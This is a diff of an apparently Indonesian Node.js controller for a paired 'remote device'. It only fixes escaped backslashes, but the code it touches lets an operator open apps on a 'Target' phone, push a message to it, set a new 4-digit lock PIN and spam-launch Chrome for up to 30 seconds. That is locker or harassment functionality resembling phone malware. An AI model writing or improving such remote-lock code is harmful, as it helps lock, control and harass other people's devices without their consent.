@@ -418,7 +418,7 @@ async function session(mode) {
           banner();
           console.log(GREEN + '[CONNECTED] REMOTE DEVICE • ' + mode + RESET);
           renderApps(apps, page, source);
-          const choice = (await ask('\\nOPEN APP > ')).trim().toLowerCase();
+          const choice = (await ask('\nOPEN APP > ')).trim().toLowerCase();
 
           if (choice === 'b' || choice === '0') break;
           if (choice === 'n') {
@@ -434,7 +434,7 @@ async function session(mode) {
             catch (e) { console.log(RED + e.message + RESET); await ask('Enter...'); }
             continue;
           }
-          if (!/^\\d+$/.test(choice)) {
+          if (!/^\d+$/.test(choice)) {
             console.log('Masukkan nomor aplikasi atau b untuk kembali.');
             await ask('Enter...');
             continue;
@@ -446,11 +446,11 @@ async function session(mode) {
             continue;
           }
           const app = apps[number - 1];
-          console.log('\\nOPENING: ' + app.name);
+          console.log('\nOPENING: ' + app.name);
           const result = await channel.request({ type: 'open_app', token, package: app.package });
           console.log(result.ok ? GREEN + '[OK] ' + RESET : RED + '[FAILED] ' + RESET);
           console.log(result.message || result.error || '');
-          await ask('\\nEnter untuk kembali ke daftar...');
+          await ask('\nEnter untuk kembali ke daftar...');
         }
         continue;
       }
@@ -458,14 +458,14 @@ async function session(mode) {
       if (feature === '2') {
         const message = (await ask('Pesan untuk Target (maks. 500 karakter): ')).slice(0, 500);
         const newPin = (await ask('PIN LOCK BARU (4 digit, berbeda dari PIN pairing): ')).trim();
-        if (!/^\\d{4}$/.test(newPin)) {
+        if (!/^\d{4}$/.test(newPin)) {
           console.log(RED + 'PIN Lock harus tepat 4 digit.' + RESET);
           await ask('Enter untuk kembali...');
           continue;
         }
         const rawDuration = (await ask('Batasan spam open Chrome (5-30 detik): ')).trim();
         const durationSeconds = Number(rawDuration);
-        if (!/^\\d+$/.test(rawDuration) || durationSeconds < 5 || durationSeconds > 30) {
+        if (!/^\d+$/.test(rawDuration) || durationSeconds < 5 || durationSeconds > 30) {
           console.log(RED + 'Durasi harus 5 sampai 30 detik.' + RESET);
           await ask('Enter untuk kembali...');
           continue;
